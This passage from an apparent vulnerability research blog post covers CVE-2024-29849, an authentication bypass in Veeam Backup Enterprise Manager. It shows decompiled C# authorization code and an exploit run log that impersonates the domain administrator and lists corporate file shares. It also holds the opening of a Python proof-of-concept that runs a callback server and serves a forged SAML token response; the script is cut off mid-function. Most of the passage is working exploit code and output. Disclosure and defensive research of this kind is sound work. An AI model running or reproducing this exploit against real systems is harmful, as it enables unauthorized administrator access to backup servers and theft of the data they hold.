</span></span><span style=display:flex><span><span style=color:#ae81ff>27</span>:  		cuserSessionContextData = <span style=color:#66d9ef>this</span>.AuthorizeByUserSid(text, securityIdentifier, array2, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>28</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>29</span>:  	<span style=color:#66d9ef>catch</span> (UnauthorizedAccessException ex)
</span></span><span style=display:flex><span><span style=color:#ae81ff>30</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>31</span>:  		Log.SecureException(ex, <span style=color:#e6db74>&#34;Failed to authorize user.&#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>32</span>:  		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#e6db74>&#34;Your account does not have any roles assigned. Please contact web portal administrator.&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#ae81ff>33</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>34</span>:  	<span style=color:#66d9ef>catch</span> (SoapException ex2)
</span></span><span style=display:flex><span><span style=color:#ae81ff>35</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>36</span>:  		Log.SecureException(ex2, <span style=color:#e6db74>&#34;Failed to invoke Single Sign-On service.&#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>37</span>:  		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#66d9ef>string</span>.Format(<span style=color:#e6db74>&#34;vCenter Single Sign-On service communication failure. Address: {0}. Service message: {1}&#34;</span>, (uri != <span style=color:#66d9ef>null</span>) ? uri.ToString() : <span style=color:#e6db74>&#34;&#34;</span>, ex2.Message));
</span></span><span style=display:flex><span><span style=color:#ae81ff>38</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>39</span>:  	<span style=color:#66d9ef>catch</span> (WebException ex3)
</span></span><span style=display:flex><span><span style=color:#ae81ff>40</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>41</span>:  		Log.SecureException(ex3, <span style=color:#e6db74>&#34;Failed to invoke Single Sign-On service.&#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>42</span>:  		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#66d9ef>string</span>.Format(<span style=color:#e6db74>&#34;vCenter Single Sign-On service communication failure. Address: {0}. Service message: {1}&#34;</span>, (uri != <span style=color:#66d9ef>null</span>) ? uri.ToString() : <span style=color:#e6db74>&#34;&#34;</span>, ex3.Message));
</span></span><span style=display:flex><span><span style=color:#ae81ff>43</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>44</span>:  	<span style=color:#66d9ef>catch</span> (SecurityException ex4)
</span></span><span style=display:flex><span><span style=color:#ae81ff>45</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>46</span>:  		Log.SecureError(<span style=color:#e6db74>&#34;Failed to authorize user. SSO token: &#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>47</span>:  		Log.AppendLines(<span style=color:#66d9ef>new</span> <span style=color:#66d9ef>string</span>[] { ssoToken });
</span></span><span style=display:flex><span><span style=color:#ae81ff>48</span>:  		Log.Exception(ex4, <span style=color:#66d9ef>null</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>49</span>:  		<span style=color:#66d9ef>throw</span>;
</span></span><span style=display:flex><span><span style=color:#ae81ff>50</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>51</span>:  	<span style=color:#66d9ef>catch</span> (Exception ex5)
</span></span><span style=display:flex><span><span style=color:#ae81ff>52</span>:  	{
</span></span><span style=display:flex><span><span style=color:#ae81ff>53</span>:  		Log.SecureError(<span style=color:#e6db74>&#34;Failed to authorize user. SSO token: &#34;</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>54</span>:  		Log.AppendLines(<span style=color:#66d9ef>new</span> <span style=color:#66d9ef>string</span>[] { ssoToken });
</span></span><span style=display:flex><span><span style=color:#ae81ff>55</span>:  		Log.Exception(ex5, <span style=color:#66d9ef>null</span>, Array.Empty&lt;<span style=color:#66d9ef>object</span>&gt;());
</span></span><span style=display:flex><span><span style=color:#ae81ff>56</span>:  		<span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> SecurityException(<span style=color:#66d9ef>string</span>.Format(<span style=color:#e6db74>&#34;Login by Single Sign-On token failed. Error message: {0}&#34;</span>, ex5.Message));
</span></span><span style=display:flex><span><span style=color:#ae81ff>57</span>:  	}
</span></span><span style=display:flex><span><span style=color:#ae81ff>58</span>:  	<span style=color:#66d9ef>return</span> cuserSessionContextData;
</span></span><span style=display:flex><span><span style=color:#ae81ff>59</span>:  }
</span></span></code></pre></div><p>The <code>AuthorizeByUserSid</code> when called expects the <code>userName</code> and the <code>userSid</code> which is of type <code>SecurityIdentifier</code> and makes call to the <code>CUserSessionContextHolder.CreateUserContextForVCPlugin</code> and is responsible to create a valid session in Veeam and we have passed all the checks
<img src=https://summoning.team/images/blog/veeam-epm/04.png alt=veeam-CVE-2024-29849></p><p>This is a summary of how things went down:</p><p align=center><img src=https://summoning.team/images/blog/veeam-epm/flow.png alt=readers></p><p>And this is how it looks like in action</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>python CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>29849.</span>py <span style=color:#f92672>--</span>target https:<span style=color:#f92672>//</span><span style=color:#ae81ff>192.168.253.180</span>:<span style=color:#ae81ff>9398</span><span style=color:#f92672>/</span> <span style=color:#f92672>--</span>callback<span style=color:#f92672>-</span>server <span style=color:#ae81ff>192.168.253.1</span>:<span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> _______ _     _ _______ _______  _____  __   _ _____ __   _  ______   _______ _______ _______ _______
</span></span><span style=display:flex><span> <span style=color:#f92672>|</span>______ <span style=color:#f92672>|</span>     <span style=color:#f92672>|</span> <span style=color:#f92672>|</span>  <span style=color:#f92672>|</span>  <span style=color:#f92672>|</span> <span style=color:#f92672>|</span>  <span style=color:#f92672>|</span>  <span style=color:#f92672>|</span> <span style=color:#f92672>|</span>     <span style=color:#f92672>|</span> <span style=color:#f92672>|</span> \  <span style=color:#f92672>|</span>   <span style=color:#f92672>|</span>   <span style=color:#f92672>|</span> \  <span style=color:#f92672>|</span> <span style=color:#f92672>|</span>  ____      <span style=color:#f92672>|</span>    <span style=color:#f92672>|</span>______ <span style=color:#f92672>|</span>_____<span style=color:#f92672>|</span> <span style=color:#f92672>|</span>  <span style=color:#f92672>|</span>  <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span> ______<span style=color:#f92672>|</span> <span style=color:#f92672>|</span>_____<span style=color:#f92672>|</span> <span style=color:#f92672>|</span>  <span style=color:#f92672>|</span>  <span style=color:#f92672>|</span> <span style=color:#f92672>|</span>  <span style=color:#f92672>|</span>  <span style=color:#f92672>|</span> <span style=color:#f92672>|</span>_____<span style=color:#f92672>|</span> <span style=color:#f92672>|</span>  \_<span style=color:#f92672>|</span> __<span style=color:#f92672>|</span>__ <span style=color:#f92672>|</span>  \_<span style=color:#f92672>|</span> <span style=color:#f92672>|</span>_____<span style=color:#f92672>|</span> <span style=color:#f92672>.</span>    <span style=color:#f92672>|</span>    <span style=color:#f92672>|</span>______ <span style=color:#f92672>|</span>     <span style=color:#f92672>|</span> <span style=color:#f92672>|</span>  <span style=color:#f92672>|</span>  <span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        (<span style=color:#f92672>*</span>) Veeam Backup Enterprise Manager Authentication Bypass (CVE<span style=color:#f92672>-</span><span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>29849</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        (<span style=color:#f92672>*</span>) Exploit by Sina Kheirkhah (<span style=color:#a6e22e>@SinSinology</span>) of SummoningTeam (<span style=color:#a6e22e>@SummoningTeam</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        (<span style=color:#f92672>*</span>) Technical details: https:<span style=color:#f92672>//</span>summoning<span style=color:#f92672>.</span>team<span style=color:#f92672>/</span>blog<span style=color:#f92672>/</span>veeam<span style=color:#f92672>-</span>cve<span style=color:#f92672>-</span><span style=color:#ae81ff>2024</span><span style=color:#f92672>-</span><span style=color:#ae81ff>29849</span><span style=color:#f92672>-</span>authentication<span style=color:#f92672>-</span>bypass<span style=color:#f92672>/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Target https:<span style=color:#f92672>//</span><span style=color:#ae81ff>192.168.253.180</span>:<span style=color:#ae81ff>9398</span> <span style=color:#f92672>is</span> reachable <span style=color:#f92672>and</span> seems to be a Veeam Backup Enterprise Manager
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Fetching certificate <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>192.168.253.180</span>
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Common Name (CN) extracted <span style=color:#f92672>from</span> certificate: batserver<span style=color:#f92672>.</span>evilcorp<span style=color:#f92672>.</span>local
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Assumed domain name: evilcorp<span style=color:#f92672>.</span>local
</span></span><span style=display:flex><span>(<span style=color:#960050;background-color:#1e0010>?</span>) Is the assumed domain name correct(Y<span style=color:#f92672>/</span>n)<span style=color:#960050;background-color:#1e0010>?</span>y
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Target domain name <span style=color:#f92672>is</span>: evilcorp<span style=color:#f92672>.</span>local
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Starting callback server
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>(<span style=color:#f92672>^</span>_<span style=color:#f92672>^</span>) Prepare <span style=color:#66d9ef>for</span> the Pwnage (<span style=color:#f92672>^</span>_<span style=color:#f92672>^</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Callback server listening on https:<span style=color:#f92672>//</span><span style=color:#ae81ff>192.168.253.1</span>:<span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>192.168.253.1</span> <span style=color:#f92672>-</span> <span style=color:#f92672>-</span> [<span style=color:#ae81ff>10</span><span style=color:#f92672>/</span>Jun<span style=color:#f92672>/</span><span style=color:#ae81ff>2024</span> <span style=color:#ae81ff>07</span>:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>21</span>] <span style=color:#e6db74>&#34;GET / HTTP/1.1&#34;</span> <span style=color:#ae81ff>200</span> <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Callback server <span style=color:#ae81ff>192.168.253.1</span>:<span style=color:#ae81ff>443</span> <span style=color:#f92672>is</span> reachable
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Triggering malicious SAML assertion to https:<span style=color:#f92672>//</span><span style=color:#ae81ff>192.168.253.180</span>:<span style=color:#ae81ff>9398</span>
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Impersonating user: administrator<span style=color:#a6e22e>@evilcorp</span><span style=color:#f92672>.</span>local
</span></span><span style=display:flex><span><span style=color:#ae81ff>192.168.253.180</span> <span style=color:#f92672>-</span> <span style=color:#f92672>-</span> [<span style=color:#ae81ff>10</span><span style=color:#f92672>/</span>Jun<span style=color:#f92672>/</span><span style=color:#ae81ff>2024</span> <span style=color:#ae81ff>07</span>:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>21</span>] <span style=color:#e6db74>&#34;POST /ims/STSService HTTP/1.1&#34;</span> <span style=color:#ae81ff>200</span> <span style=color:#f92672>-</span>
</span></span><span style=display:flex><span>(<span style=color:#f92672>+</span>) SAML Auth request received, serving malicious RequestSecurityTokenResponseType
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>(<span style=color:#f92672>+</span>) Exploit was Successful, authenticated <span style=color:#66d9ef>as</span> administrator<span style=color:#a6e22e>@evilcorp</span><span style=color:#f92672>.</span>local
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Got token: YzFlZTI3NDctMjlkZS00NmU1LWE1YWItNzkxNmZkZjJlZDYx
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Starting post<span style=color:#f92672>-</span>exploitation phase
</span></span><span style=display:flex><span>(<span style=color:#f92672>*</span>) Retrieving the list of file servers
</span></span><span style=display:flex><span>{<span style=color:#e6db74>&#39;FileServers&#39;</span>: [{<span style=color:#e6db74>&#39;ServerType&#39;</span>: <span style=color:#e6db74>&#39;SmbServer&#39;</span>, <span style=color:#e6db74>&#39;HierarchyObjRef&#39;</span>: <span style=color:#e6db74>&#39;urn:NasBackup:FileServer:9dee6394-bf7a-4dc6-a9a5-4faf2e22551d.0d4a7862-82cb-4c93-a53b-e500d6cb9e35&#39;</span>, <span style=color:#e6db74>&#39;SmbServerOptions&#39;</span>: {<span style=color:#e6db74>&#39;Path&#39;</span>: <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>192.168.253.134</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>corporate-docs&#39;</span>, <span style=color:#e6db74>&#39;CredentialsId&#39;</span>: <span style=color:#66d9ef>None</span>}, <span style=color:#e6db74>&#39;NfsServerOptions&#39;</span>: <span style=color:#66d9ef>None</span>, <span style=color:#e6db74>&#39;FileServerOptions&#39;</span>: <span style=color:#66d9ef>None</span>, <span style=color:#e6db74>&#39;ProcessingOptions&#39;</span>: {<span style=color:#e6db74>&#39;ServerUid&#39;</span>: <span style=color:#e6db74>&#39;urn:veeam:FileServer:0d4a7862-82cb-4c93-a53b-e500d6cb9e35&#39;</span>, <span style=color:#e6db74>&#39;CacheRepositoryUid&#39;</span>: <span style=color:#e6db74>&#39;urn:veeam:Repository:88788f9e-d8f5-4eb4-bc4f-9b3f5403bcec&#39;</span>}, <span style=color:#e6db74>&#39;NASServerAdvancedOptions&#39;</span>: {<span style=color:#e6db74>&#39;ProcessingMode&#39;</span>: <span style=color:#e6db74>&#39;Direct&#39;</span>, <span style=color:#e6db74>&#39;StorageSnapshotPath&#39;</span>: <span style=color:#66d9ef>None</span>}, <span style=color:#e6db74>&#39;Name&#39;</span>: <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>192.168.253.134</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>corporate-docs&#39;</span>, <span style=color:#e6db74>&#39;UID&#39;</span>: <span style=color:#e6db74>&#39;urn:veeam:FileServer:0d4a7862-82cb-4c93-a53b-e500d6cb9e35&#39;</span>, <span style=color:#e6db74>&#39;Links&#39;</span>: [{<span style=color:#e6db74>&#39;Rel&#39;</span>: <span style=color:#e6db74>&#39;Up&#39;</span>, <span style=color:#e6db74>&#39;Href&#39;</span>: <span style=color:#e6db74>&#39;https://192.168.253.180:9398/api/backupServers/e59b6cc4-444e-4a2d-a986-3d4d0b8791de&#39;</span>, <span style=color:#e6db74>&#39;Name&#39;</span>: <span style=color:#e6db74>&#39;192.168.253.134&#39;</span>, <span style=color:#e6db74>&#39;Type&#39;</span>: <span style=color:#e6db74>&#39;BackupServerReference&#39;</span>}, {<span style=color:#e6db74>&#39;Rel&#39;</span>: <span style=color:#e6db74>&#39;Alternate&#39;</span>, <span style=color:#e6db74>&#39;Href&#39;</span>: <span style=color:#e6db74>&#39;https://192.168.253.180:9398/api/nas/fileServers/0d4a7862-82cb-4c93-a53b-e500d6cb9e35&#39;</span>, <span style=color:#e6db74>&#39;Name&#39;</span>: <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>192.168.253.134</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>corporate-docs&#39;</span>, <span style=color:#e6db74>&#39;Type&#39;</span>: <span style=color:#e6db74>&#39;FileServerReference&#39;</span>}], <span style=color:#e6db74>&#39;Href&#39;</span>: <span style=color:#e6db74>&#39;https://192.168.253.180:9398/api/nas/fileServers/0d4a7862-82cb-4c93-a53b-e500d6cb9e35?format=Entity&#39;</span>, <span style=color:#e6db74>&#39;Type&#39;</span>: <span style=color:#e6db74>&#39;FileServer&#39;</span>}]}
</span></span></code></pre></div><h1 id=proof-of-concept>Proof of Concept</h1><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Veeam Backup Enterprise Manager Authentication Bypass (CVE-2024-29849)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Exploit By: Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Technical details: https://summoning.team/blog/veeam-enterprise-manager-CVE-2024-29849-auth-bypass/
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>banner <span style=color:#f92672>=</span> <span style=color:#e6db74>r</span><span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74> _______ _     _ _______ _______  _____  __   _ _____ __   _  ______   _______ _______ _______ _______
</span></span></span><span style=display:flex><span><span style=color:#e6db74> |______ |     | |  |  | |  |  | |     | | \  |   |   | \  | |  ____      |    |______ |_____| |  |  |
</span></span></span><span style=display:flex><span><span style=color:#e6db74> ______| |_____| |  |  | |  |  | |_____| |  \_| __|__ |  \_| |_____| .    |    |______ |     | |  |  |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>                                                                                    
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        (*) Veeam Backup Enterprise Manager Authentication Bypass (CVE-2024-29849) 
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        (*) Exploit by Sina Kheirkhah (@SinSinology) of SummoningTeam (@SummoningTeam)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        (*) Technical details: https://summoning.team/blog/veeam-cve-2024-29849-authentication-bypass/
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> http.server <span style=color:#f92672>import</span> HTTPServer, SimpleHTTPRequestHandler
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> ssl
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> warnings
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>warnings<span style=color:#f92672>.</span>filterwarnings(<span style=color:#e6db74>&#34;ignore&#34;</span>, category<span style=color:#f92672>=</span><span style=color:#a6e22e>DeprecationWarning</span>)
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>requests<span style=color:#f92672>.</span>packages<span style=color:#f92672>.</span>urllib3<span style=color:#f92672>.</span>disable_warnings()
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> argparse
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> ssl
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> urllib.parse <span style=color:#f92672>import</span> urlparse
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> ssl
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> OpenSSL
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography <span style=color:#f92672>import</span> x509
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> cryptography.hazmat.backends <span style=color:#f92672>import</span> default_backend
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> urllib.parse <span style=color:#f92672>import</span> urlparse
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> threading <span style=color:#f92672>import</span> Thread
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(banner)
</span></span><span style=display:flex><span>parser <span style=color:#f92672>=</span> argparse<span style=color:#f92672>.</span>ArgumentParser(usage<span style=color:#f92672>=</span><span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;python CVE-2024-29849.py --target https://192.168.253.180:9398 --callback-server 192.168.253.1:443&#39;</span>)
</span></span><span style=display:flex><span>parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;--target&#39;</span>, <span style=color:#e6db74>&#39;-t&#39;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;target&#39;</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Target IP and port (e.g: https://192.168.1.1:9398)&#39;</span>, required<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;--callback-server&#39;</span>, <span style=color:#e6db74>&#39;-s&#39;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;callback_server&#39;</span>,  help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Callback server for authentication bypass&#39;</span>, required<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;--domain-name&#39;</span>, <span style=color:#e6db74>&#39;-d&#39;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;domain_name&#39;</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;target domain name&#39;</span>,default<span style=color:#f92672>=</span><span style=color:#66d9ef>None</span>, required<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;--target-user&#39;</span>, <span style=color:#e6db74>&#39;-u&#39;</span>, dest<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;target_user&#39;</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;username to impersonate&#39;</span>,default<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;administrator&#39;</span>, required<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>args <span style=color:#f92672>=</span> parser<span style=color:#f92672>.</span>parse_args()
</span></span><span style=display:flex><span>args<span style=color:#f92672>.</span>target <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>target<span style=color:#f92672>.</span>rstrip(<span style=color:#e6db74>&#39;/&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CustomHandler</span>(SimpleHTTPRequestHandler):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_POST</span>(self):
</span></span><span style=display:flex><span>        xml_response <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-16&#34;?&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;soap:Envelope xmlns:soap=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;soap:Body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;RequestSecurityTokenResponse xmlns=&#34;http://docs.oasis-open.org/ws-sx/ws-trust/200512&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;TokenType&gt;urn:oasis:names:tc:SAML:2.0:assertion&lt;/TokenType&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;Status&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;Code&gt;http://docs.oasis-open.org/ws-sx/ws-trust/200512/status/valid&lt;/Code&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;/Status&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &lt;/RequestSecurityTokenResponse&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>  &lt;/soap:Body&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;/soap:Envelope&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>200</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#34;Content-type&#34;</span>, <span style=color:#e6db74>&#34;text/xml&#34;</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>end_headers()
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(xml_response<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;utf-8&#34;</span>))
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;(+) SAML Auth request received, serving malicious RequestSecurityTokenResponseType&#34;</span>)
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>start_callback_server</span>(ip, port):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>global</span> server_ready
</span></span><span style=display:flex><span>    <span style=color:#75715e># openssl req -new -x509 -keyout key.pem -out server.pem -days 365 -nodes</span>
</span></span><span style=display:flex><span>    httpd <span style=color:#f92672>=</span> HTTPServer((ip, port), CustomHandler)
</span></span><span style=display:flex><span>    ssl_context <span style=color:#f92672>=</span> ssl<span style=color:#f92672>.</span>SSLContext(ssl<span style=color:#f92672>.</span>PROTOCOL_TLS_SERVER)
</span></span><span style=display:flex><span>    ssl_context<span style=color:#f92672>.</span>load_cert_chain(<span style=color:#e6db74>&#34;server.pem&#34;</span>, keyfile<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;key.pem&#34;</span>)
</span></span><span style=display:flex><span>    httpd<span style=color:#f92672>.</span>socket <span style=color:#f92672>=</span> ssl_context<span style=color:#f92672>.</span>wrap_socket(
</span></span><span style=display:flex><span>        httpd<span style=color:#f92672>.</span>socket,
</span></span><span style=display:flex><span>        server_side<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>,
</span></span><span style=display:flex><span>    )
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(*) Callback server listening on https://</span><span style=color:#e6db74>{</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74>:</span><span style=color:#e6db74>{</span>port<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    server_ready <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>    httpd<span style=color:#f92672>.</span>serve_forever()
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_cn_from_cert</span>(target):
</span></span><span style=display:flex><span>    parsed_url <span style=color:#f92672>=</span> urlparse(target)
</span></span><span style=display:flex><span>    hostname <span style=color:#f92672>=</span> parsed_url<span style=color:#f92672>.</span>hostname
</span></span><span style=display:flex><span>    domain_name <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> parsed_url<span style=color:#f92672>.</span>port <span style=color:#f92672>==</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>        parsed_url<span style=color:#f92672>.</span>port <span style=color:#f92672>=</span> <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;(*) Fetching certificate for </span><span style=color:#e6db74>{</span>hostname<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>        cert <span style=color:#f92672>=</span> ssl<span style=color:#f92672>.</span>get_server_certificate((hostname, int(parsed_url<span style=color:#f92672>.</span>port)))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
